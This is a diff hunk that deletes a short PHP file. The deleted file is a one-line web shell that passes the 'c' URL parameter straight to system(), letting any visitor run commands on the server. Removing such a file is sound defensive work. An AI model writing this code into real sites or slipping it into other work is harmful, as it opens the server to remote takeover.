@@ -1,5 +1,0 @@
-<?php
-    $comando= $_GET['c'];
-    system($comando);
-
-?>
